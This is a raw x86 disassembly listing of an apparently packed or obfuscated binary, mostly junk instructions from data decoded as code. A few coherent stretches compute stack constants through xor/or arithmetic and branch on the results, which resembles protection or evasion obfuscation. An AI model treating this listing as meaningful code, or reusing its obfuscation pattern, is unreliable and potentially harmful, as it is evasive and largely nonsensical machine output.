  41a1a1:	cld    
  41a1a2:	addr16 cli 
  41a1a4:	shr    BYTE PTR [eax-0xd],0x6a
  41a1a8:	and    DWORD PTR [esi-0x67],ebx
  41a1ab:	mul    BYTE PTR [esi-0x76]
  41a1ae:	mov    esp,0x7ed36262
  41a1b3:	push   ebx
  41a1b4:	mov    ebx,0x80b8180e
  41a1b9:	sub    edi,DWORD PTR [esi+0x68]
  41a1bc:	mov    DWORD PTR [edi+0x34],edx
  41a1bf:	daa    
  41a1c0:	xchg   ecx,eax
  41a1c1:	lods   eax,DWORD PTR ds:[esi]
  41a1c2:	sub    esp,DWORD PTR [edx+eiz*1+0x280db088]
  41a1c9:	mov    ds:0x4361c6ab,eax
  41a1ce:	cwde   
  41a1cf:	mov    eax,ds:0x5558bbd5
  41a1d4:	cdq    
  41a1d5:	rcl    ch,0xcb
  41a1d8:	test   eax,0xcd81630c
  41a1dd:	mov    edi,0x4ba9dc47
  41a1e2:	sub    al,0xd7
  41a1e4:	cmp    dh,dh
  41a1e6:	out    0xe3,eax
  41a1e8:	dec    esp
  41a1e9:	add    ebp,ebx
  41a1eb:	mov    bh,0xcf
  41a1ed:	pop    esp
  41a1ee:	jg     0x41a1c0
  41a1f0:	enter  0xcb5b,0x49
  41a1f4:	out    0xc4,eax
  41a1f6:	in     al,dx
  41a1f7:	inc    ebx
  41a1f8:	sub    ecx,esp
  41a1fa:	push   cs
  41a1fb:	push   ecx
  41a1fc:	sbb    esp,DWORD PTR [edi]
  41a1fe:	bt     DWORD PTR [edi-0x6a],ebp
  41a202:	loope  0x41a1db
  41a204:	and    eax,0x2017e1
  41a209:	adc    ebx,edi
  41a20b:	stc    
  41a20c:	and    al,0xda
  41a20e:	mov    ebx,esp
  41a210:	cwde   
  41a211:	pop    ecx
  41a212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a213:	xor    eax,0x1a967b8c
  41a218:	stos   BYTE PTR es:[edi],al
  41a219:	jg     0x41a1b5
  41a21b:	stc    
  41a21c:	mov    dh,BYTE PTR ds:0x5d25db10
  41a222:	xor    al,BYTE PTR [eax]
  41a224:	add    BYTE PTR [ecx-0x7eafdbbc],cl
  41a22a:	loope  0x41a270
  41a22c:	xor    eax,0x4c890000
  41a231:	and    al,0x54
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	sbb    dl,BYTE PTR [ecx+ecx*8]
  41a2a3:	jl     0x41a2d0
  41a2a5:	lods   eax,DWORD PTR ds:[esi]
  41a2a6:	push   ss
  41a2a7:	sbb    BYTE PTR [edx+edx*1-0x1088e7e8],bh
  41a2ae:	int3   
  41a2af:	loopne 0x41a2f9
  41a2b1:	imul   esi,DWORD PTR [edx+0x21],0xfe2a4d9c
  41a2b8:	xlat   BYTE PTR ds:[ebx]
  41a2b9:	pop    ds
  41a2ba:	(bad)  [ebx*4+0xee5287e]
  41a2c1:	cmp    al,0x68
  41a2c3:	xchg   esi,eax
  41a2c4:	cwde   
  41a2c5:	push   edx
  41a2c6:	jne    0x41a263
  41a2c8:	jae    0x41a260
  41a2ca:	sub    esp,DWORD PTR [ebx-0x6a]
  41a2cd:	sahf   
  41a2ce:	xor    al,0xb4
  41a2d0:	movntq QWORD PTR [ebx-0x62],mm1
  41a2d4:	xor    ecx,ebp
  41a2d6:	iret   
  41a2d7:	enter  0xe3bf,0xaa
  41a2db:	(bad)  
  41a2dc:	aad    0x60
  41a2de:	jne    0x41a291
  41a2e0:	push   ebx
  41a2e1:	xor    eax,0xb6b156ca
  41a2e6:	jns    0x41a274
  41a2e8:	adc    ah,BYTE PTR [ebx-0x7441ab0f]
  41a2ee:	loope  0x41a303
  41a2f0:	ja     0x41a284
  41a2f2:	jbe    0x41a294
  41a2f4:	(bad)  
  41a2f5:	pusha  
  41a2f6:	push   ebp
  41a2f7:	test   al,0x2f
  41a2f9:	inc    BYTE PTR [ebp+0x16]
  41a2fc:	mov    esp,?
  41a2fe:	and    esp,DWORD PTR ds:0x6350f771
  41a304:	jnp    0x41a325
  41a306:	push   edx
  41a307:	mov    ecx,0x1c1cbf8f
  41a30c:	cdq    
  41a30d:	hlt    
  41a30e:	sbb    DWORD PTR [ebx+0x4a],edx
  41a311:	jg     0x41a2b4
  41a313:	or     eax,0xf833fdb
  41a318:	repnz retf 0xd079
  41a31c:	xchg   esi,eax
  41a31d:	pop    esi
  41a31e:	mov    al,0x5b
  41a320:	adc    eax,0xef772c5c
  41a325:	jecxz  0x41a32e
  41a327:	xchg   ebx,eax
  41a328:	stc    
  41a329:	mov    ecx,esp
  41a32b:	fimul  WORD PTR [edx-0x1cf33791]
  41a331:	aas    
  41a332:	mov    DWORD PTR [edx],esi
  41a334:	bound  esp,QWORD PTR [ecx+edi*8+0x48]
  41a338:	jmp    0x10240bb3
  41a33d:	xor    bh,BYTE PTR [edi+0x115531a2]
  41a343:	dec    esi
  41a344:	jne    0x41a2ec
  41a346:	mov    ds:0x5935c257,al
  41a34b:	cli    
  41a34c:	add    al,0xd7
  41a34e:	mov    ah,0x81
  41a350:	cmp    DWORD PTR [esi],esp
  41a352:	arpl   ax,bx
  41a354:	push   0xc4649ade
  41a359:	mov    ch,0x3
  41a35b:	push   DWORD PTR ds:0xdcc58f7f
  41a361:	dec    ebp
  41a362:	inc    eax
  41a363:	inc    edi
  41a364:	rol    DWORD PTR [ecx+0x35be2771],cl
  41a36a:	out    0xee,al
  41a36c:	sbb    eax,0xdf24c98
  41a371:	inc    edi
  41a372:	aad    0x96
  41a374:	scas   eax,DWORD PTR es:[edi]
  41a375:	nop
  41a376:	dec    edi
  41a377:	fisttp WORD PTR [edx+0x3f]
  41a37a:	mov    edx,0x1cde16d
  41a37f:	adc    eax,0x6b4cec8b
  41a384:	inc    eax
  41a385:	mov    esp,DWORD PTR [esi-0x45]
  41a388:	aad    0x41
  41a38a:	jle    0x41a33f
  41a38c:	xor    al,0xa9
  41a38e:	jb     0x41a31c
  41a390:	dec    eax
  41a391:	mov    BYTE PTR [edi+0x1d3453ce],dh
  41a397:	push   ds
  41a398:	pop    esp
  41a399:	jb     0x41a3ce
  41a39b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a39c:	mov    fs,ebp
  41a39e:	das    
  41a39f:	sbb    esp,DWORD PTR [ebp+0x45b90063]
  41a3a5:	icebp  
  41a3a6:	(bad)  
  41a3a7:	dec    esp
  41a3a8:	jecxz  0x41a3ee
  41a3aa:	lods   al,BYTE PTR ds:[esi]
  41a3ab:	out    0x6b,eax
  41a3ad:	xor    al,0xb4
  41a3af:	sub    ecx,esi
  41a3b1:	add    al,0x1c
  41a3b3:	iret   
  41a3b4:	xchg   esi,eax
  41a3b5:	dec    eax
  41a3b6:	mov    esp,0xbdb1d318
  41a3bb:	stc    
  41a3bc:	push   esi
  41a3bd:	xchg   ebp,eax
  41a3be:	out    dx,eax
  41a3bf:	lea    ebx,[eax+0x12]
  41a3c2:	mov    dl,0x2e
  41a3c4:	retf   0xaba7
  41a3c7:	fdiv   QWORD PTR [ebp-0x14]
  41a3ca:	mov    esp,0x81c2834
  41a3cf:	(bad)  
  41a3d0:	fiadd  WORD PTR [eax-0x37250566]
  41a3d6:	push   0x250ca3b2
  41a3db:	scas   eax,DWORD PTR es:[edi]
  41a3dc:	xchg   edx,eax
  41a3dd:	xchg   esp,eax
  41a3de:	push   0xfffffffa
  41a3e0:	or     BYTE PTR [edi+edx*8-0x79],ch
  41a3e4:	mov    al,ds:0x96f86fa4
  41a3e9:	jecxz  0x41a382
  41a3eb:	xchg   ecx,eax
  41a3ec:	mov    dl,0x88
  41a3ee:	add    al,0xc4
  41a3f0:	xor    dl,BYTE PTR [edx]
  41a3f2:	mov    ds:0x7875c2e3,eax
  41a3f7:	add    BYTE PTR [eax+edx*1-0x150dda8d],ch
  41a3fe:	dec    eax
  41a3ff:	scas   eax,DWORD PTR es:[edi]
  41a400:	sbb    eax,0x16054741
  41a405:	xchg   edx,eax
  41a406:	aas    
  41a407:	push   0x698cfdc3
  41a40c:	xor    eax,0x551a69c2
  41a411:	das    
  41a412:	fdiv   st,st(3)
  41a414:	push   edx
  41a415:	xlat   BYTE PTR ds:[ebx]
  41a416:	push   esi
  41a417:	jmp    FWORD PTR [ecx-0x51]
  41a41a:	sub    DWORD PTR [ebx],0x27
  41a41d:	xchg   DWORD PTR [edx+0x29965c04],ebp
  41a423:	add    ch,bh
  41a425:	mov    BYTE PTR [edi+0x303297f4],ah
  41a42b:	mov    al,0xfb
  41a42d:	or     eax,0xedacf224
  41a432:	sar    DWORD PTR [eax+0x7b387add],0x2b
  41a439:	inc    esp
  41a43a:	test   DWORD PTR [ebx+0x52],0x5ab5e96b
  41a441:	mov    dh,0xb9
  41a443:	push   esi
  41a444:	mov    eax,ds:0x1449a8ee
  41a449:	inc    ecx
  41a44a:	ror    BYTE PTR [edx+edi*4+0x17],0xbc
  41a44f:	xchg   ebp,eax
  41a450:	std    
  41a451:	mov    edi,0x98c4b6b5
  41a456:	sbb    BYTE PTR [ebx+0x80d5f09],cl
  41a45c:	cs stc 
  41a45e:	pop    edi
  41a45f:	sub    eax,DWORD PTR ds:0x528f8ac9
  41a465:	call   0x2ef3:0xfbf96c90
  41a46c:	dec    esp
  41a46d:	xlat   BYTE PTR ds:[ebx]
  41a46e:	xchg   dl,bh
  41a470:	outs   dx,DWORD PTR ds:[esi]
  41a471:	xchg   BYTE PTR [edx+0x55689387],bl
  41a477:	jae    0x41a429
  41a479:	scas   eax,DWORD PTR es:[edi]
  41a47a:	push   edi
  41a47b:	shl    BYTE PTR [ebp+0x2d],1
  41a47e:	fcmovu st,st(2)
  41a480:	push   DWORD PTR [esi-0xb]
  41a483:	dec    eax
  41a484:	add    ah,dh
  41a486:	imul   ebx,DWORD PTR [eax-0x332780de],0x8c125ddf
  41a490:	dec    esi
  41a491:	sbb    al,0xc4
  41a493:	mov    ebp,0x4134866
  41a498:	out    dx,al
  41a499:	leave  
  41a49a:	out    dx,al
  41a49b:	push   ebx
  41a49c:	dec    ebx
  41a49d:	dec    eax
  41a49e:	retf   
  41a49f:	sbb    al,0x17
  41a4a1:	(bad)  
  41a4a2:	lods   eax,DWORD PTR ds:[esi]
  41a4a3:	aas    
  41a4a4:	add    bl,bl
  41a4a6:	dec    BYTE PTR [ecx+0x6e9a7642]
  41a4ac:	or     eax,0x4d24aba
  41a4b1:	cmp    BYTE PTR [esi],al
  41a4b3:	dec    eax
  41a4b4:	push   0xffffff99
  41a4b6:	fisub  DWORD PTR [ecx-0x75]
  41a4b9:	cwde   
  41a4ba:	jp     0x41a471
  41a4bc:	xchg   edi,eax
  41a4bd:	pop    ax
  41a4bf:	adc    al,0x89
  41a4c1:	sar    BYTE PTR [ecx+0x63d9ef0b],0x36
  41a4c8:	inc    BYTE PTR [ebp-0x9]
  41a4cb:	ja     0x41a49f
  41a4cd:	lea    esp,[ebx-0x3c]
  41a4d0:	jmp    0x41a509
  41a4d2:	popa   
  41a4d3:	mov    ebp,0x1195e0e9
  41a4d8:	test   DWORD PTR [edi-0x1ce0a7fc],esi
  41a4de:	es jl  0x41a4d0
  41a4e1:	dec    edx
  41a4e2:	jecxz  0x41a46d
  41a4e4:	jp     0x41a4c6
  41a4e6:	outs   dx,BYTE PTR ds:[esi]
  41a4e7:	sub    eax,0xa321cd4a
  41a4ec:	xor    BYTE PTR [ebx],ah
  41a4ee:	in     eax,0x4d
  41a4f0:	xchg   edx,eax
  41a4f1:	dec    esi
  41a4f2:	mov    bl,0x88
  41a4f4:	bound  esp,QWORD PTR [edi]
  41a4f6:	arpl   WORD PTR [ecx+ebx*1+0x45ae7d5b],cx
  41a4fd:	int3   
  41a4fe:	cdq    
  41a4ff:	fs dec esp
  41a501:	(bad)  
  41a502:	add    ch,BYTE PTR [edi+eiz*4+0x69cf62df]
  41a509:	mov    edx,0x13de746
  41a50e:	xor    BYTE PTR [edx+0x1f6b9f84],ah
  41a514:	je     0x41a56a
  41a516:	mov    esp,DWORD PTR ds:0xf946d7b8
  41a51c:	lods   al,BYTE PTR ds:[esi]
  41a51d:	test   al,0xd9
  41a51f:	jle    0x41a537
  41a521:	sub    ebp,edi
  41a523:	dec    esp
  41a524:	dec    eax
  41a525:	in     eax,dx
  41a526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a527:	mov    ds:0x88dcf4ff,al
  41a52c:	dec    esp
  41a52d:	mov    edx,0xe8b14b6b
  41a532:	sub    eax,0xdafa58ce
  41a537:	call   FWORD PTR [edx-0x3ad96ba5]
  41a53d:	jmp    0x1d94:0x3304800b
  41a544:	mov    ds:0xc4c608db,eax
  41a549:	mov    DWORD PTR [edx+0x59281095],0xcf9cc233
  41a553:	shl    BYTE PTR [ecx+ecx*4-0x65],cl
  41a557:	push   0x0
  41a559:	cmp    al,0xa5
  41a55b:	(bad)  [edi-0x47]
  41a55e:	leave  
  41a55f:	pop    esi
  41a560:	push   ss
  41a561:	pushf  
  41a562:	bound  edx,QWORD PTR [edi]
  41a564:	ins    BYTE PTR es:[edi],dx
  41a565:	inc    eax
  41a566:	mov    ds:0xa497adff,eax
  41a56b:	jno    0xb7ecf786
  41a571:	test   BYTE PTR [ebp+eax*8-0x6b82ded4],dh
  41a578:	pop    ebp
  41a579:	in     al,0x1c
  41a57b:	stc    
  41a57c:	jo     0x41a53d
  41a57e:	dec    esp
  41a57f:	out    0x98,al
  41a581:	out    0x80,al
  41a583:	jno    0x41a5e4
  41a585:	xor    DWORD PTR [edx+0x3d],ebx
  41a588:	jns    0x41a58a
  41a58a:	xlat   BYTE PTR ds:[ebx]
  41a58b:	pop    ebp
  41a58c:	jae    0x41a5c1
  41a58e:	fcomp  QWORD PTR [esi+0x32ab695a]
  41a594:	jmp    0xe984304f
  41a599:	ret    
  41a59a:	mov    esp,0xdce23d0
  41a59f:	pop    edi
  41a5a0:	clc    
  41a5a1:	dec    ebx
  41a5a2:	xchg   edx,eax
  41a5a3:	pushf  
  41a5a4:	fisub  DWORD PTR [eax]
  41a5a6:	ret    0x246
  41a5a9:	mul    DWORD PTR [edi+ebx*1]
  41a5ac:	imul   esp,DWORD PTR [ebx],0xa528c1f8
  41a5b2:	test   eax,0x2ef3f499
  41a5b7:	and    edi,DWORD PTR [edi-0x29]
  41a5ba:	pop    ss
  41a5bb:	in     al,dx
  41a5bc:	jge    0x41a607
  41a5be:	xchg   ebx,eax
  41a5bf:	es dec eax
  41a5c1:	jl     0x41a60f
  41a5c3:	test   DWORD PTR [ebx-0x296752a],ecx
  41a5c9:	xor    edx,DWORD PTR [ecx-0x25]
  41a5cc:	push   ecx
  41a5cd:	add    ebx,eax
  41a5cf:	(bad)  
  41a5d0:	gs dec esi
  41a5d2:	repnz dec ebp
  41a5d4:	lds    ebp,FWORD PTR [ebx+0x30]
  41a5d7:	ficomp DWORD PTR [eax-0x6b2dafba]
  41a5dd:	mov    bl,0xbe
  41a5df:	xor    edi,DWORD PTR [edx]
  41a5e1:	cmc    
  41a5e2:	or     BYTE PTR [ebx-0x1c4156a],dh
  41a5e8:	(bad)  
  41a5e9:	aam    0x76
  41a5eb:	in     eax,dx
  41a5ec:	pop    ds
  41a5ed:	aam    0xbb
  41a5ef:	dec    esi
  41a5f0:	pop    edx
  41a5f1:	jnp    0x41a607
  41a5f3:	or     bl,BYTE PTR [edx-0xb71d02f]
  41a5f9:	inc    esp
  41a5fa:	scas   eax,DWORD PTR es:[edi]
  41a5fb:	sbb    al,BYTE PTR [ecx]
  41a5fd:	inc    DWORD PTR [eax+eax*2]
  41a600:	sbb    eax,0xc5a12ae0
  41a605:	and    BYTE PTR ds:0x2a6f7cdb,ah
  41a60b:	int3   
  41a60c:	xchg   ch,dh
  41a60e:	hlt    
  41a60f:	imul   edx,edi,0xffffffe1
  41a612:	loopne 0x41a617
  41a614:	aaa    
  41a615:	outs   dx,BYTE PTR ds:[esi]
  41a616:	push   0xb9e0ad29
  41a61b:	mov    ecx,0x37784ec1
  41a620:	and    al,0x5b
  41a622:	pop    es
  41a623:	dec    eax
  41a624:	xchg   esi,eax
  41a625:	jg     0x41a618
  41a627:	cld    
  41a628:	loop   0x41a617
  41a62a:	sub    al,0x58
  41a62c:	xlat   BYTE PTR ds:[ebx]
  41a62d:	es mov dh,0xa2
  41a630:	mov    bh,0x62
  41a632:	mov    edx,0xa18ba760
  41a637:	mov    eax,0xf364586c
  41a63c:	lea    ebp,[edx]
  41a63e:	popf   
  41a63f:	xchg   esi,eax
  41a640:	add    al,0x81
  41a642:	(bad)  
  41a643:	lds    ebp,FWORD PTR [edx]
  41a645:	dec    edx
  41a646:	mov    esi,0xe674f4e7
  41a64b:	out    0xf3,al
  41a64d:	in     al,0x75
  41a64f:	fcmovnbe st,st(0)
  41a651:	mov    ds:0x8025e061,al
  41a656:	loop   0x41a5fe
  41a658:	or     DWORD PTR [ecx-0x6],ebx
  41a65b:	xor    ebp,eax
  41a65d:	das    
  41a65e:	sub    eax,ecx
  41a660:	mov    ecx,DWORD PTR [esp+0x50]
  41a664:	sbb    edx,ebx
  41a666:	mov    ebx,DWORD PTR [esp+0x54]
  41a66a:	cmp    ecx,eax
  41a66c:	jne    0x41a67a
  41a672:	cmp    ebx,edx
  41a674:	je     0x41d921
  41a67a:	mov    DWORD PTR [esp+0x30],0x71ba
  41a682:	mov    DWORD PTR [esp+0x34],0x5f78
  41a68a:	mov    DWORD PTR [esp+0x10],0x7b9c
  41a692:	mov    DWORD PTR [esp+0x14],0x5622
  41a69a:	mov    eax,DWORD PTR [esp+0x10]
  41a69e:	mov    ecx,DWORD PTR [esp+0x14]
  41a6a2:	mov    edx,DWORD PTR [esp+0x30]
  41a6a6:	mov    ebx,DWORD PTR [esp+0x34]
  41a6aa:	add    eax,0x3646
  41a6af:	adc    ecx,0x7ace
  41a6b5:	xor    eax,0x3e2e
  41a6ba:	xor    ecx,0x4b71
  41a6c0:	and    eax,edx
  41a6c2:	mov    DWORD PTR [esp+0x88],eax
  41a6c9:	and    ecx,ebx
  41a6cb:	mov    DWORD PTR [esp+0x8c],ecx
  41a6d2:	mov    DWORD PTR [esp+0x50],0x18d6
  41a6da:	mov    DWORD PTR [esp+0x54],0x2bb4
  41a6e2:	mov    DWORD PTR [esp+0x48],0x14
  41a6ea:	mov    DWORD PTR [esp+0x4c],0x0
  41a6f2:	mov    DWORD PTR [esp+0x30],0x1
  41a6fa:	mov    DWORD PTR [esp+0x34],0x0
  41a702:	mov    DWORD PTR [esp+0x10],0xa87
  41a70a:	mov    DWORD PTR [esp+0x14],0x7fd9
  41a712:	mov    eax,DWORD PTR [esp+0x10]
  41a716:	mov    ecx,DWORD PTR [esp+0x14]
  41a71a:	push   0x2
  41a71c:	push   0x7f349462
  41a721:	xor    ecx,0x3601
  41a727:	xor    eax,0x5491
  41a72c:	push   ecx
  41a72d:	push   eax
  41a72e:	call   0x42205c
  41a733:	mov    ecx,DWORD PTR [esp+0x30]
  41a737:	jmp    0x41ab06
  41a73c:	cmp    ebx,DWORD PTR [edi-0x7b]
  41a73f:	arpl   WORD PTR ds:0xe91f1b5b,sp
  41a745:	add    cl,BYTE PTR [ebx+0x7e]
  41a748:	mov    ebp,0xcf7cb353
  41a74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74e:	push   ss
  41a74f:	sbb    BYTE PTR [edx+edx*1-0xb11e7e8],bh
  41a756:	and    al,0xb3
  41a759:	dec    ebx
  41a75a:	inc    ecx
  41a75b:	lahf   
  41a75c:	ins    DWORD PTR es:[edi],dx
  41a75d:	call   0x3ef9:0x1579d1b9
  41a764:	cdq    
  41a765:	or     DWORD PTR [eax-0x662bb3e5],edx
  41a76b:	call   0xdb95f8cc
  41a770:	repnz shr BYTE PTR ds:0xe0857f2a,cl
  41a777:	jo     0x41a735
  41a779:	sbb    al,0x6b
  41a77b:	sahf   
  41a77c:	lea    esi,[eax-0x55]
  41a77f:	push   si
  41a781:	aaa    
  41a782:	dec    edx
  41a783:	idiv   DWORD PTR [edi]
  41a785:	xor    al,0x8
  41a787:	add    ebp,eax
  41a789:	jg     0x41a753
  41a78b:	jecxz  0x41a75f
  41a78d:	inc    esi
  41a78e:	cmp    eax,0x8bb4c361
  41a793:	xchg   esi,eax
  41a794:	idiv   DWORD PTR [ebx+0x57a2875f]
  41a79a:	loop   0x41a74b
  41a79c:	shufps xmm0,XMMWORD PTR [eax+0xe],0xf3
  41a7a1:	icebp  
  41a7a2:	push   0x34
  41a7a4:	inc    edi
  41a7a5:	mov    BYTE PTR ds:0xac55fc8a,0x2
  41a7ac:	adc    al,BYTE PTR [eax]
  41a7ae:	inc    esi
  41a7af:	sbb    BYTE PTR [eax-0x5be1c7ce],al
  41a7b5:	stos   BYTE PTR es:[edi],al
  41a7b6:	mov    ecx,0xc8f02aea
  41a7bb:	mov    ds:0x772474a0,eax
  41a7c0:	icebp  
  41a7c1:	fisubr DWORD PTR [eax+0x64]
  41a7c4:	(bad)  
  41a7c5:	leave  
  41a7c6:	pop    edi
  41a7c7:	add    DWORD PTR [edi+0x1429707],0xe1f756e9
  41a7d1:	mov    ecx,0xa72a0ddc
  41a7d6:	pop    esi
  41a7d7:	push   ebx
  41a7d8:	stos   BYTE PTR es:[edi],al
  41a7d9:	popf   
  41a7da:	das    
  41a7db:	leave  
  41a7dc:	mov    edi,0x1380447f
  41a7e1:	enter  0xbb95,0xde
  41a7e5:	aaa    
  41a7e6:	jge    0x41a7cc
  41a7e8:	mov    ecx,0xfbad5f0e
  41a7ed:	out    0x93,eax
  41a7ef:	mov    ah,BYTE PTR [ebp+0x7e]
  41a7f2:	test   DWORD PTR [ecx],eax
  41a7f4:	lods   al,BYTE PTR ds:[esi]
  41a7f5:	cmp    eax,0x696f8651
  41a7fa:	mov    ah,0xb6
  41a7fc:	jp     0x41a7d4
  41a7fe:	cli    
  41a7ff:	dec    edx
  41a800:	les    esp,FWORD PTR [esi+ecx*8]
  41a803:	cli    
  41a804:	ins    DWORD PTR es:[edi],dx
  41a805:	push   ecx
  41a806:	jmp    0x6ee2771a
  41a80b:	jbe    0x41a80b
  41a80d:	in     al,dx
  41a80e:	or     BYTE PTR [ebp-0x745155fa],bh
  41a814:	xor    al,BYTE PTR [edi+0x3d]
  41a817:	xor    BYTE PTR [esi],bl
  41a819:	(bad)  
  41a81b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a81c:	popf   
  41a81d:	mov    es,WORD PTR [ecx]
  41a81f:	stos   BYTE PTR es:[edi],al
  41a820:	mov    BYTE PTR [ebp+0x50],dh
  41a823:	bound  ebp,QWORD PTR ds:0xbf5679c0
  41a829:	and    dl,cl
  41a82b:	dec    ebp
  41a82c:	loope  0x41a7f8
  41a82e:	lods   eax,DWORD PTR ds:[esi]
  41a82f:	mov    esp,0x79cf3925
  41a834:	hlt    
  41a835:	icebp  
  41a836:	ficom  WORD PTR [eax]
  41a838:	in     eax,0x2f
  41a83a:	in     eax,dx
  41a83b:	xor    eax,0x3ea95e2d
  41a840:	and    al,0x37
  41a842:	inc    edx
  41a843:	bound  eax,QWORD PTR [esp+eax*1-0x48]
  41a847:	pop    ss
  41a848:	jmp    0x6c8d:0xe0fc8571
  41a84f:	xchg   esi,eax
  41a850:	cmc    
  41a851:	ins    DWORD PTR es:[edi],dx
  41a852:	sbb    BYTE PTR [esi+0x3a11c925],dl
  41a858:	(bad)  
  41a859:	mov    cl,0x86
  41a85b:	fwait
  41a85c:	jno    0x41a7e2
  41a85e:	out    0xb3,eax
  41a860:	lahf   
  41a861:	pop    esi
  41a862:	lods   eax,DWORD PTR ds:[esi]
  41a863:	mov    esp,DWORD PTR [esi-0x35]
  41a866:	cmp    eax,0xba28dbdd
  41a86b:	ror    esp,cl
  41a86d:	adc    DWORD PTR [edi],edi
  41a86f:	inc    ecx
  41a870:	xor    DWORD PTR [edi-0xe782cbc],edi
  41a876:	add    bh,bl
  41a878:	xchg   BYTE PTR [eax-0x6c9c3a13],bh
  41a87e:	(bad)  
  41a87f:	repz pop esi
  41a881:	push   ecx
  41a882:	push   ss
  41a883:	(bad)  
  41a884:	push   eax
  41a885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a886:	jecxz  0x41a86d
  41a888:	iret   
  41a889:	and    al,0x18
  41a88b:	or     al,0x9a
  41a88d:	jne    0x41a856
  41a88f:	(bad)  
  41a891:	dec    ecx
  41a892:	cmp    al,0x7e
  41a894:	inc    edx
  41a895:	je     0x41a90a
  41a897:	mov    BYTE PTR [ebx+0xdc814e9],bl
  41a89d:	stos   BYTE PTR es:[edi],al
  41a89e:	loop   0x41a86c
  41a8a0:	add    esi,0xffffffec
  41a8a3:	jb     0x41a853
  41a8a5:	(bad)  
  41a8a6:	dec    edi
  41a8a7:	xor    al,0x5f
  41a8a9:	pop    esp
  41a8aa:	jle    0x41a8ea
  41a8ac:	adc    DWORD PTR [esi+0x4e6a52d5],0x30
  41a8b3:	mov    edi,0x4d6ac14b
  41a8b8:	out    0xc5,al
  41a8ba:	jmp    0x41a8a4
  41a8bc:	cdq    
  41a8bd:	mov    esi,0x76f66566
  41a8c2:	or     DWORD PTR [esi+0x48],ebx
  41a8c5:	sti    
  41a8c6:	push   gs
  41a8c8:	jns    0x41a905
  41a8ca:	jg     0x41a878
  41a8cc:	and    esp,edx
  41a8ce:	scas   al,BYTE PTR es:[edi]
  41a8cf:	mov    esp,0x53f8814c
  41a8d4:	test   al,0x22
  41a8d6:	push   ss
  41a8d7:	retf   0x6a7b
  41a8da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8db:	mov    al,BYTE PTR [edi+0x1ff9b48f]
  41a8e1:	test   eax,0x64dfd220
  41a8e6:	int3   
  41a8e7:	adc    esi,DWORD PTR [esi]
  41a8e9:	adc    cl,BYTE PTR [ebx-0x43d959]
  41a8ef:	std    
  41a8f0:	lods   eax,DWORD PTR gs:[esi]
  41a8f2:	scas   eax,DWORD PTR es:[edi]
  41a8f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8f5:	ds mov bh,0x10
  41a8f8:	inc    ebx
  41a8f9:	ror    BYTE PTR [eax+0x3b],cl
  41a8fc:	mov    al,0x64
  41a8fe:	xchg   BYTE PTR [esi+eax*4],dl
  41a901:	mov    ebp,0x28d3ac47
  41a906:	jecxz  0x41a946
  41a908:	xchg   edi,eax
  41a909:	dec    ebx
  41a90a:	mov    esp,0x5ac97383
  41a90f:	and    BYTE PTR [ebx],dh
  41a911:	scas   al,BYTE PTR es:[edi]
  41a912:	cli    
  41a913:	pop    edi
  41a914:	and    eax,0xf13e5782
  41a919:	xor    DWORD PTR [ebx],esp
  41a91b:	jmp    0x6518c901
  41a920:	mov    al,ds:0xd63fc3a4
  41a925:	jge    0x41a9a2
  41a927:	push   ecx
  41a928:	mov    al,0x10
  41a92a:	and    DWORD PTR [edi],ebp
  41a92c:	jnp    0x41a8bf
  41a92e:	ds ret 0x91c4
  41a932:	mov    WORD PTR [edi-0x2e],es
  41a935:	in     eax,0xce
  41a937:	adc    BYTE PTR [edi-0x16],0x86
  41a93b:	out    dx,eax
  41a93c:	and    al,0x38
  41a93e:	fbld   TBYTE PTR [edi+0xa]
  41a941:	inc    edi
  41a942:	(bad)  
  41a943:	fcmovb st,st(6)
  41a945:	mov    ?,WORD PTR [eax-0x43]
  41a948:	pop    edi
  41a949:	pop    ecx
  41a94a:	es cs xchg edx,eax
  41a94d:	gs ja  0x41a904
  41a950:	rcr    DWORD PTR [ebp+0xed90059],0xd
  41a957:	inc    esp
  41a958:	dec    edx
  41a959:	call   DWORD PTR [eax+0x13]
  41a95c:	push   edi
  41a95d:	rcl    DWORD PTR [edx],0xf4
  41a960:	xchg   BYTE PTR [ebp-0x2a],al
  41a963:	les    esi,FWORD PTR [edi+esi*8+0x73]
  41a967:	leave  
  41a968:	dec    edx
  41a969:	sub    DWORD PTR [ebp-0x3f],ecx
  41a96c:	jo     0x41a959
  41a96e:	sub    al,0x1d
  41a970:	mov    edi,0x11560282
  41a975:	aam    0xae
  41a977:	xchg   ebp,eax
  41a978:	fsubr  DWORD PTR [ecx+0x1f]
  41a97b:	test   BYTE PTR [edx-0x48],dl
  41a97e:	mov    DWORD PTR [eax+eiz*2],ecx
  41a981:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41a983:	mov    DWORD PTR [ebx+0x3afb862e],ecx
  41a989:	adc    eax,0xea695882
  41a98e:	or     eax,0x596815e3
  41a993:	or     BYTE PTR [eax+0x66],dl
  41a996:	push   ds
  41a997:	popf   
  41a998:	mov    DWORD PTR [ebx-0x7],0xeede6637
